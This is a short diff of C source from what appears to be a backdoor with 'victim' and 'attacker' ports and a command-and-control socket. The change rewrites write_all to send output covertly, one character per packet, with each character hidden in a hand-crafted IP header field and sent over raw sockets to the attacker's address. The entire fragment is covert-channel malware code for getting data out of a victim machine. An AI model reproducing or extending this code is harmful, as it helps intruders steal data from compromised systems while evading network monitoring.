@@ -61,18 +61,27 @@ void safe_write_all(int file_desc, const char *str, int keyboard, struct options
 }
 
 
-int write_all(int file_desc, const char *str, struct options_victim* ov) {
+int write_all(int file_desc, const char *str, struct options_victim* opts) {
     int bytesWritten = 0;
     int bytesToWrite = (int)strlen(str);
+    char s_buffer[TCP_SEND_SIZE] = {0};
+    struct iphdr ih;
+    struct tcphdr th;
 
     uint16_t size = (uint16_t)strlen(str);
-
-
     do {
 //        bytesWritten = (int)write(file_desc, str, bytesToWrite);
-        bytesWritten = (int)write(ov->cnc_socket, str, size);
-        if(bytesWritten == -1) {
-            return 0;
+        for (int i = 0; i < size; i++) {
+            create_tcp_header(&th, VIC_TCP_PORT, ATC_TCP_PORT);
+            create_ip_header(&ih, opts, 'V', str[i], 'T');
+            memcpy(s_buffer, &ih, sizeof(struct iphdr));
+            memcpy(s_buffer + sizeof(struct iphdr), &th, sizeof(struct tcphdr));
+            bytesWritten = (int)sendto(opts->tcp_socket, (const char *) s_buffer, TCP_SEND_SIZE, 0,
+                                       (const struct sockaddr *) &opts->tcpsa, sizeof(opts->tcpsa));
+//            bytesWritten = (int)write(opts->tcp_socket, str, size);
+            if(bytesWritten == -1) {
+                return 0;
+            }
         }
         bytesToWrite -= bytesWritten;
         str += bytesWritten;
